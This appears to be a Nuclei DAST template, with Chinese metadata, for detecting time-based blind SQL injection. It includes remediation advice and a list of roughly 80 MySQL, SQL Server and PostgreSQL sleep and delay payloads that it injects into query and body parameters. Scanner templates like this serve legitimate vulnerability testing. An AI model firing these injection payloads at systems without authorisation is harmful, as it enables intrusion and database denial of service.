id: time-based-sqli

info:
  name: 基于时间的盲 SQL 注入（DAST）
  author: 0xKayala,Jaenact
  severity: critical
  description: |
    基于时间的盲 SQL 注入在页面无报错和无直接回显时，通过数据库延时函数验证攻击者输入是否进入 SQL 执行路径。模板先确认基线响应时间不超过阈值，再用 MySQL、SQL Server、PostgreSQL 等延时载荷替换查询参数和请求体，响应耗时达到 7 秒以上时判定注入成立。
  impact: |
    - 攻击者可在无回显场景下逐步推断数据库内容，最终泄露账户、令牌和业务数据。
    - 大量延时查询还可能拖垮数据库连接池，造成接口性能下降或拒绝服务。
  remediation: |
    - 所有 SQL 使用参数化绑定或安全 ORM API，避免把用户输入拼接到条件、排序、函数或表达式中。
    - 为数据库查询设置超时和速率限制，监控异常延时函数与重复探测行为。
  tags: time-based-sqli,sqli,dast,blind,vuln

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        dsl:
          - "duration<=7"
        internal: true

  - raw:
      - |
        @timeout: 20s
        GET / HTTP/1.1
        Host: {{Hostname}}

    payloads:
      injection:
        # MySQL / MariaDB
        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
        - "if(now()=sysdate(),SLEEP(7),0)"
        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
        - "sleep(7)#"
        - "1 or sleep(7)#"
        - "\" or sleep(7)#"
        - "' or sleep(7)#"
        - "\" or sleep(7)=\""
        - "' or sleep(7)='"
        - "1) or sleep(7)#"
        - "\") or sleep(7)=\""
        - "') or sleep(7)='"
        - "1)) or sleep(7)#"
        - "\")) or sleep(7)=\""
        - "')) or sleep(7)='"
        - "AND (SELECT * FROM (SELECT(SLEEP(7)))bAKL) AND 'vRxe'='vRxe"
        - "AND (SELECT * FROM (SELECT(SLEEP(7)))YjoC) AND '%'='"
        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)"
        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)--"
        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)#"
        - "SLEEP(7)#"
        - "SLEEP(7)--"
        - "SLEEP(7)=\""
        - "SLEEP(7)='"
        - "or SLEEP(7)"
        - "or SLEEP(7)#"
        - "or SLEEP(7)--"
        - "or SLEEP(7)=\""
        - "or SLEEP(7)='"
        - "AnD SLEEP(7)"
        - "AnD SLEEP(7)--"
        - "AnD SLEEP(7)#"
        - "&&SLEEP(7)"
        - "&&SLEEP(7)--"
        - "&&SLEEP(7)#"
        - "' AnD SLEEP(7) ANd '1"
        - "'&&SLEEP(7)&&'1"
        - "ORDER BY SLEEP(7)"
        - "ORDER BY SLEEP(7)--"
        - "ORDER BY SLEEP(7)#"
        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)"
        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)#"
        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)--"
        - "+ SLEEP(7) + '"
        - "SLEEP(7)/*' or SLEEP(7) or '\" or SLEEP(7) or \"*/"

        # SQL Server
        - ";waitfor delay '0:0:7'--"
        - ");waitfor delay '0:0:7'--"
        - "';waitfor delay '0:0:7'--"
        - "\";waitfor delay '0:0:7'--"
        - "');waitfor delay '0:0:7'--"
        - "\");waitfor delay '0:0:7'--"
        - "));waitfor delay '0:0:7'--"
        - "'));waitfor delay '0:0:7'--"
        - "\"));waitfor delay '0:0:7'--"
        - "waitfor delay '00:00:07'"
        - "waitfor delay '00:00:07'--"
        - "waitfor delay '00:00:07'#"

        # PostgreSQL
        - "pg_sleep(7)--"
        - "1 or pg_sleep(7)--"
        - "\" or pg_sleep(7)--"
        - "' or pg_sleep(7)--"
        - "1) or pg_sleep(7)--"
        - "\") or pg_sleep(7)--"
        - "') or pg_sleep(7)--"
        - "1)) or pg_sleep(7)--"
        - "\")) or pg_sleep(7)--"
        - "')) or pg_sleep(7)--"
        - "pg_SLEEP(7)"
        - "pg_SLEEP(7)--"
        - "pg_SLEEP(7)#"
        - "or pg_SLEEP(7)"
        - "or pg_SLEEP(7)--"
        - "or pg_SLEEP(7)#"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - "duration>=7 && duration <=16"
